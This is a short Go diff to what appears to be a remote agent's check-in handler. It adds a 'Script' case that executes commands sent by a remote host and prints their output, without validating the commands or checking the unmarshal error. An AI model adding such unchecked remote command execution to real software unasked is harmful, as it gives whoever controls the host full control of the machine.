@@ -285,6 +285,14 @@ func (n *node) continueCheckIn(j messages.Base, payload json.RawMessage, host st
 		if resp2.StatusCode != 200 {
 			log.Println("Error: ", resp2.StatusCode)
 		}
+
+	case "Script":
+		var p messages.CmdPayload
+		json.Unmarshal(payload, &p)
+		fmt.Println(p)
+		stdout, stderr := n.executeCommand(p)
+		fmt.Println(stdout)
+		fmt.Println(stderr)
 	}
 }
 
